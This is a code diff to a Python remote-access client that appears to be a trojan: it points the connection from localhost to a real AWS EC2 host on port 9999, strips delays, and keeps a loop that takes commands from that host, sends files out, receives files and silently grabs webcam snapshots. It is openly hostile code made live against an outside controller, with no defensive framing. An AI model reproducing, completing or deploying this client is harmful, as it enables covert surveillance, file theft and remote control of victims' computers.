@@ -9,11 +9,10 @@ import random
 def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size))
 
-Conn=revnet.ClientConn('127.0.0.1',9999)
+Conn=revnet.ClientConn('ec2-15-185-207-141.me-south-1.compute.amazonaws.com',9999)
 
 while True:
 
-	time.sleep(1)
 	CurrentDir=os.getcwd()
 	Conn.sendstring(CurrentDir)
 	Command=Conn.recvstring()
@@ -36,31 +35,23 @@ while True:
 			Ack='Bad'
 
 		Conn.sendstring(Ack)
-		time.sleep(0.5)
 		Conn.sendfile(Command[5:])
-		time.sleep(0.5)
 
 	elif Command[0:6]=='ftrans':
 
 		Ack=Conn.recvstring()
-
-		time.sleep(0.5)
 
 		if Ack!='Bad':
 
 			Conn.recvfile(Command[7:])
 			print('received')
 
-		time.sleep(0.5)
-
 	elif Command[0:7]=='wc_snap':
 
 		try:
 
 			Camera=cv2.VideoCapture(0)
-			time.sleep(0.5)
 			ret,img=Camera.read()
-			time.sleep(0.5)
 			File=id_generator()+'.png'
 			cv2.imwrite(File,img)
 			del Camera
